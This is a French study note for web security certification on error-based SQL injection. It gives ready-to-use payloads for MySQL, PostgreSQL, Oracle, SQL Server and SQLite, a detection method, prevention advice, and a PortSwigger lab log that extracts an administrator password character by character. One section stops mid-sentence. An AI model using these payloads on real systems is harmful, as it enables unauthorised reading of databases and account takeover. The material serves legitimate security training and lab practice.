---
tags:
  - bscp
  - server-side
  - sql-injection
niveau: practitioner
statut: en cours
---
# Error-based SQL Injection

## En bref
- Cette technique d'injection désigne les cas où les messages d'erreur permettent de déduire ou de lire des données de la base, même quand les résultats de la requête ne sont pas affichés.
- Il existe 2 familles :
	- **Erreurs conditionnelles :** on provoque une erreur uniquement si une condition booléenne injectée est vraie. La différence de réponse (code 500, message, page vide) sert d'oracle. L'exploitation est la même que pour les réponses conditionnelles de [[Blind-SQL-injection]].
	- **Messages d'erreur verbeux :** on provoque une erreur dont le texte cite la donnée demandée (conversion de type, XPath, parsing XML). Cela transforme une injection aveugle en injection visible.
- Une erreur n'est exploitable que si (a) l'application la laisse passer dans une réponse différenciable, ou (b) le texte de l'erreur cite la donnée.
- Distinction utile : l'erreur de syntaxe sert à détecter l'injection, l'erreur d'exécution (division par zéro, conversion de type) sert à extraire ou à déduire.

## Types et variantes

| SGBD | Fonction d'erreur verbeuse | Oracle conditionnel | Une seule ligne |
|---|---|---|---|
| MySQL ou MariaDB | `EXTRACTVALUE`, `UPDATEXML` (32 caractères affichés) | `IF(cond,(SELECT ... plusieurs lignes),'a')` | `LIMIT 1` |
| PostgreSQL | `CAST(... AS int)` ou `::int` | `CASE WHEN cond THEN 1/(SELECT 0) ELSE 1 END` | `LIMIT 1` |
| Oracle | `XMLTYPE`, `UTL_INADDR`, `CTXSYS.DRITHSX.SN` (les deux derniers dépendent de la version et des droits) | `CASE WHEN cond THEN TO_CHAR(1/0) ELSE '' END FROM dual` | `ROWNUM=1` |
| SQL Server | `CONVERT(int,...)`, `CAST(... AS int)` | `CASE WHEN cond THEN 1/0 ELSE 1 END` | `TOP 1` |
| SQLite | aucune fiable | `CASE WHEN cond THEN abs(-9223372036854775808) ELSE 1 END` (selon la version) | `LIMIT 1` |

- Pour les syntaxes générales par moteur (concaténation, sous-chaînes, commentaires), voir le tableau de [[Blind-SQL-injection]] ; il n'est pas recopié ici.

## Comment détecter

**Démarche**
1. Ajouter une apostrophe, puis deux apostrophes. Si l'erreur apparaît puis disparaît, une erreur de syntaxe a un effet détectable.
2. Confirmer que l'erreur vient bien d'une requête SQL : construire une sous-requête valide avec une concaténation neutre (`'||(SELECT '')||'`), puis tester une table inexistante. Une erreur n'apparaissant qu'avec la table inexistante indique que le serveur exécute du SQL.
3. Si `(SELECT '')` échoue mais `(SELECT '' FROM dual)` passe, la cible est probablement Oracle (tout `SELECT` exige une table).
4. S'assurer que l'erreur dépend bien de la condition : envoyer la paire (condition vraie, condition fausse) au moins trois fois, avec les témoins `1=1` et `1=2`. Cela évite les faux positifs (pare-feu applicatif, délai, taille de réponse).

**Arbre de décision**
- L'erreur est affichée en clair : tester une conversion de type pour faire citer la donnée (famille verbeuse). La preuve n'est faite que si la valeur apparaît littéralement dans le message.
- Seul le code HTTP ou la taille change : utiliser les erreurs conditionnelles.
- Rien ne change : passer aux délais puis à l'hors bande (voir [[Blind-SQL-injection]]).

**Reconnaître le SGBD dans un message d'erreur verbeux**

| Indice dans le message | SGBD probable |
|---|---|
| `You have an error in your SQL syntax ... near`, `XPATH syntax error: '...'` | MySQL ou MariaDB |
| `ERROR: invalid input syntax for type integer: "..."`, `argument of AND must be type boolean` | PostgreSQL |
| `ORA-01722`, `ORA-00933`, `ORA-31011`, `ORA-29257` | Oracle |
| `Conversion failed when converting the nvarchar value '...' to data type int`, `Unclosed quotation mark after the character string` | Microsoft SQL Server |
| `SQLITE_ERROR`, `unrecognized token`, `near "...": syntax error` | SQLite |

## Comment exploiter (principe)
- On modifie la requête pour qu'elle provoque une erreur de base de données uniquement si la condition injectée est vraie (famille conditionnelle), ou pour que l'erreur cite la donnée (famille verbeuse).
- Une erreur non gérée provoque très souvent une différence dans la réponse de l'application, ce qui permet de déduire si la condition est vraie ou fausse.
- Conventions des payloads : `'` ferme une chaîne (en contexte numérique, retirer les apostrophes) ; `-- ` est un commentaire (MySQL exige l'espace après `--`, ou utiliser `#`) ; `cond` est la condition booléenne à tester. Dans un cookie ou une URL, encoder l'espace, le point-virgule et les caractères spéciaux.
- Lecture seule et une seule ligne à la fois. Pour une preuve de concept, un caractère ou le nom de l'utilisateur de la base suffit.

### Erreurs conditionnelles : principe avec `CASE`
- `CASE WHEN (cond) THEN <expression qui échoue> ELSE <valeur valide> END` : l'erreur ne survient que si `cond` est vraie.
- Extraction : on teste un caractère à la fois avec `SUBSTRING`/`SUBSTR` et une comparaison (`=`, ou `>` et `<` pour une recherche dichotomique qui réduit le nombre de requêtes). Chaque caractère coûte une ou plusieurs requêtes.
- Exemple de forme (SQL Server) : `xyz' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM users)='a`
- Un exemple sur Oracle figure dans le journal des labs.
- `1/0` n'est pas universel : voir les sections par SGBD.
### Extraction de données via des messages d'erreur SQL
- Une base de données mal configurée renvoie des messages détaillées qui exposent des informations exploitables.
- Par exemple, injecter une simple quote dans un paramètre, ici `id` et observer l'erreur.
`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
- L'erreur révèle:
	- La requête complète construite par l'application
	- Le contexte d'injection: une chaîne entre simple quotes dans une clause `WHERE`
- Intérêt pour l'exploitation: connaître le contexte facilite la construction d'une requête valide contenant le payload.
- Technique: Commenter le reste de la requête pour neutraliser la simple quote en trop qui casserait la syntaxe.

- On peut également utiliser `CAST()` pour convertir un type de données en une autre:
```sql
CAST((SELECT example_column FROM example_table) AS int)
```
- Mécanisme: la donnée ciblée est très souvent une chaîne. La convertir en un type incompatibl


### MySQL et MariaDB
MySQL ne fait pas fuiter la valeur par une conversion de type classique. On passe par des fonctions XML qui échouent en citant l'argument.

1. EXTRACTVALUE (verbeux)
   - Payload : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)))-- `
   - Signal : `XPATH syntax error: '~<valeur>'` (le préfixe `0x7e`, soit `~`, force l'erreur XPath).
   - Limite : environ 32 caractères affichés. Extraire par tranches avec `SUBSTRING((SELECT ...),1,31)`, puis `SUBSTRING((SELECT ...),32,31)`.
2. UPDATEXML (verbeux, équivalent)
   - Payload : `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)),1)-- `
   - Même signal et même limite. Utile si l'une des deux fonctions est filtrée.
3. Double requête avec `FLOOR(RAND())` (verbeux, ancien)
   - Payload : `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- `
   - Signal : `Duplicate entry '<valeur>~1' for key 'group_key'`. Cette technique dépend de la version.
4. Conditionnel par sous-requête multi-lignes (pas verbeux)
   - Payload : `' AND IF(cond,(SELECT table_name FROM information_schema.tables),'a')-- `
   - Signal : erreur "Subquery returns more than 1 row" si `cond` est vraie, page normale sinon. C'est la forme présente dans [[Blind-SQL-injection]].
   - Variante : `' AND (SELECT CASE WHEN (cond) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- `
   - `1/0` seul renvoie NULL en lecture sur MySQL : il ne déclenche pas d'erreur, il ne faut donc pas le réutiliser tel quel.
5. Autres fonctions parfois citées (`GTID_SUBSET`, `JSON_KEYS`, `EXP(~(SELECT * FROM (SELECT ...)x))`) : elles dépendent de la version et ne sont pas à essayer en premier.

### PostgreSQL
La conversion `CAST` vers `int` échoue en citant la chaîne, ce qui fait fuiter la donnée.

1. CAST vers entier (verbeux)
   - Détection du contexte : `' AND CAST((SELECT 1) AS int)-- ` renvoie `argument of AND must be type boolean, not type integer`, ce qui confirme PostgreSQL et un contexte booléen.
   - Payload : `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- `
   - Signal : `ERROR: invalid input syntax for type integer: "administrator"`.
   - Mot de passe : `' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)-- `
2. Opérateur `::` : `' AND 1=(SELECT username FROM users LIMIT 1)::int-- ` (utile si le mot `CAST` est filtré).
3. Plusieurs lignes : `' AND 1=CAST((SELECT string_agg(username,',') FROM users) AS int)-- `. Moins fiable à cause de la troncature ; préférer `LIMIT 1 OFFSET n`.
4. Conditionnel par division par zéro
   - Payload : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE 1 END)-- `
   - Signal : `division by zero` si `cond` est vraie. `(SELECT 0)` empêche l'optimiseur de plier la constante à la planification, ce qui rend `1/0` seul peu fiable.
   - Variante par conversion : `CASE WHEN (cond) THEN CAST('a' AS int) ELSE 1 END`.

### Oracle
Tout `SELECT` exige `FROM dual`, la concaténation se fait avec `||`, et il n'y a pas de `LIMIT` : utiliser `ROWNUM=1` ou `FETCH FIRST 1 ROWS ONLY`.

1. Conditionnel (voir aussi le journal des labs)
   - Payload : `'||(SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
   - Signal : division par zéro (HTTP 500 dans le lab) si `cond` est vraie.
   - `TO_CHAR` garde un type de retour cohérent (chaîne) dans le `CASE`.
   - Extraction : `cond` = `SUBSTR(password,1,1)='a'` avec `FROM users WHERE username='administrator'`. Longueur : `LENGTH(password)>n`.
2. XMLTYPE (verbeux)
   - Payload : `' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT password FROM users WHERE username='administrator' AND ROWNUM=1)||CHR(62))) FROM dual)-- `
   - Signal : `ORA-31011: XML parsing failed` avec la valeur citée dans le détail. `CHR(60)` est `<` et `CHR(58)` est `:`, ce qui produit un nom XML invalide.
   - Version simplifiée : `' || (SELECT XMLTYPE(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)) FROM dual) || '`
3. `UTL_INADDR.GET_HOST_NAME` (verbeux, selon la version et les listes de contrôle d'accès réseau)
   - Payload : `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- `
   - Signal : `ORA-29257: host <valeur> unknown`.
4. `CTXSYS.DRITHSX.SN` (verbeux, nécessite les droits adéquats et la présence d'Oracle Text)
   - Payload : `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- `
   - Signal : `ORA-20000: Oracle Text error` avec la valeur.
5. `TO_NUMBER` ou `CAST` en nombre : `ORA-01722: invalid number` signale l'erreur mais, selon les versions, ne cite pas la valeur. C'est utile surtout comme oracle conditionnel.

### Microsoft SQL Server
La conversion `CONVERT` ou `CAST` vers `int` fait fuiter la chaîne. `TOP 1` remplace `LIMIT 1`.

1. CONVERT (verbeux)
   - Payload : `' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users WHERE username='administrator'))-- `
   - Signal : `Conversion failed when converting the nvarchar value '<valeur>' to data type int.`
2. CAST (équivalent) : `' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)-- `
3. Version et utilisateur : `' AND 1=CONVERT(int,@@version)-- ` ; `' AND 1=CONVERT(int,SYSTEM_USER)-- `
4. Plusieurs lignes : `' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- ` (SQL Server 2017 et suivants). Pour les versions plus anciennes : `(SELECT name+',' FROM sys.tables FOR XML PATH(''))`.
5. Erreurs de regroupement (anciennes versions) : `' HAVING 1=1-- ` puis `' GROUP BY <colonne> HAVING 1=1-- ` révèlent progressivement les noms `table.colonne`.
6. Conditionnel par division par zéro
   - Payload : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)-- `
   - Signal : `Divide by zero error encountered` si `cond` est vraie.
   - Requêtes empilées, si le contexte les autorise : `'; IF (cond) SELECT 1/0-- `. Le point-virgule s'encode `%3B` dans un cookie.

### SQLite
Il n'existe ni fonction XML ni conversion qui cite la valeur, et `CAST` ne lève pas d'erreur (renvoie 0). L'erreur sert uniquement d'oracle conditionnel.

1. Conditionnel (selon la version) : `' AND (SELECT CASE WHEN (cond) THEN abs(-9223372036854775808) ELSE 1 END)=1-- ` ; signal : `integer overflow` quand `cond` est vraie.
2. Autre oracle (extension JSON1 requise) : `json('{')` dans la branche vraie du `CASE`, signal `malformed JSON`.
3. Exclu : `randomblob(<très grand>)` consomme de la mémoire, risque de déni de service.
4. Si les erreurs sont affichées, `no such column: <nom>` aide à énumérer le schéma.

### Automatisation
- Pour tester de nombreux caractères, utiliser Burp Intruder (voir [[Using-Burp-Suite]] et la section dédiée de [[Blind-SQL-injection]]).
- Spécifique ici : l'oracle est le statut HTTP 500 contre 200, lisible dans la colonne "Status" des résultats.

## Pièges et points d'attention BSCP
- `1/0` n'est pas universel : NULL sur MySQL, optimiseur qui plie la constante sur PostgreSQL (`1/(SELECT 0)`), `TO_CHAR(1/0)` et `FROM dual` sur Oracle.
- Une seule ligne par sous-requête (`LIMIT 1`, `TOP 1`, `ROWNUM=1`), sinon l'erreur devient "more than one row" et masque la valeur.
- Troncature du message : vider la valeur d'origine du cookie `TrackingId` pour gagner de la place. EXTRACTVALUE et UPDATEXML coupent à 32 caractères environ : extraire par tranches.
- Cookie et encodage : encoder les espaces, points-virgules et caractères spéciaux ; la plupart des payloads se terminent par `-- ` avec un espace (MySQL) ou par une apostrophe finale qui rééquilibre la requête.
- Le statut 500 est l'oracle : surveiller le code de réponse et pas seulement le contenu.
- Répéter plusieurs fois l'essai vrai/faux avant de conclure.
- Mots-clés ou apostrophes filtrés : essayer les équivalents (`::int` pour `CAST`, `UPDATEXML` pour `EXTRACTVALUE`).
- Privilèges et version : `UTL_INADDR`, `CTXSYS.*` et plusieurs fonctions MySQL ne sont pas toujours disponibles.

## Prévention
- Requêtes paramétrées pour toutes les valeurs.
- Liste blanche pour les noms de colonnes ou de tables passés dynamiquement.
- Moindre privilège du compte applicatif (pas d'accès à `information_schema`, `sys.*`, `CTXSYS`).
- Messages d'erreur génériques en production, avec journalisation côté serveur ; désactiver les erreurs détaillées (`display_errors`, `customErrors`).
- Uniformiser les réponses pour que 500 et 200 ne servent pas d'oracle.
- Masquer les erreurs ne supprime pas la vulnérabilité : l'injection aveugle reste exploitable par délai ou hors bande.

## Labs PortSwigger
- [ ] Apprentice
- [ ] Practitioner ✅ 2026-11-02 (Blind SQL injection avec erreurs conditionnelles)

- [ ] Expert

## Journal des labs
### Blind SQL injection avec erreurs conditionnelles
Résumé : le cookie `TrackingId` est injectable, aucun résultat n'est renvoyé, une erreur SQL produit un message d'erreur personnalisé. La base contient une table `users` (colonnes `username`, `password`). But : retrouver le mot de passe de `administrator` et se connecter. SGBD identifié : Oracle.

#### Solution
La démarche de détection (apostrophes, `FROM dual`, table inexistante) est décrite dans "Comment détecter". Séquence de payloads utilisés (valeur d'origine `TrackingId=xyz`) :

1. Table `users` existante : `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`. Pas d'erreur, donc la table existe. `ROWNUM = 1` évite de renvoyer plus d'une ligne, ce qui casserait la concaténation.
2. Conditions : `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` donne une erreur ; avec `(1=2)` l'erreur disparaît. L'erreur survient donc quand la condition est vraie.
3. Utilisateur : `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`. L'erreur est reçue, `administrator` existe.
4. Longueur du mot de passe : `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`, puis `>2`, `>3`, etc. avec Burp Repeater. L'erreur disparaît à la longueur : **20 caractères**.
5. Extraction caractère par caractère avec Burp Intruder : `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`, liste simple `a` à `z` et `0` à `9`. Le code 500 repère le bon caractère ; changer l'offset (`SUBSTR(password,2,1)`, etc.) pour chaque position. Détails d'Intruder dans [[Blind-SQL-injection]].
6. Se connecter en tant que `administrator` via "My account" avec le mot de passe trouvé.

### Visible error-based SQL injection (niveau Practitioner, non réalisé)
Lab de référence de la famille verbeuse : le cookie `TrackingId` est injectable et le message d'erreur SQL est affiché. Déroulé attendu, à valider lors de la réalisation du lab (le SGBD attendu est PostgreSQL)
1. Ajouter `'` et observer l'erreur SQL affichée.
2. Tester `' AND CAST((SELECT 1) AS int)-- ` : le message indique que `AND` attend un booléen.
3. Corriger en `' AND 1=CAST((SELECT 1) AS int)-- `.
4. Remplacer `SELECT 1` par `SELECT username FROM users LIMIT 1`, puis `SELECT password FROM users WHERE username='administrator' LIMIT 1`.
5. Si le message est tronqué, supprimer la valeur d'origine du cookie.
6. Se connecter en tant que `administrator`.

## Liens
- [[SQL-injection]]
- [[Blind-SQL-injection]]
- [[SQL-injection-Union-Attacks]]
- [[Using-Burp-Suite]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
